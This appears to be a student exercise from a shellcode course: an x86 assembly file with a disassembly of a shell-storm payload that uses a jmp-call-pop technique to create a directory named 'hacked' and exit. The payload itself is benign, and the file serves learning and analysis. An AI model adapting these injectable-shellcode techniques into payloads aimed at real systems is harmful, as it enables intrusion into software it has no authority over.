; A6 - Polymorphic Shellcode
; William Moody
; 31.12.2021
; PA-26540
; Original: http://shell-storm.org/shellcode/files/shellcode-542.php

; echo -ne"\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x23"|ndisasm -u -
; 00000000  EB16              jmp short 0x18
; 00000002  5E                pop esi
; 00000003  31C0              xor eax,eax
; 00000005  884606            mov [esi+0x6],al
; 00000008  B027              mov al,0x27
; 0000000A  8D1E              lea ebx,[esi]
; 0000000C  66B9ED01          mov cx,0x1ed
; 00000010  CD80              int 0x80
; 00000012  B001              mov al,0x1
; 00000014  31DB              xor ebx,ebx
; 00000016  CD80              int 0x80
; 00000018  E8E5FFFFFF        call 0x2
; 0000001D  6861636B65        push dword 0x656b6361
; 00000022  64                fs
; 00000023  23                db 0x23

global _start
section .text
_start:
	jmp call_func

func:
	pop esi
	xor eax, eax
	mov [esi+0x6], al
	mov al, 0x27
	lea ebx, [esi]
	mov cx, 0x1ed
	int 0x80

	mov al, 0x1
	xor ebx, ebx
	int 0x80

call_func:
	call func
	foldername: db "hacked#"
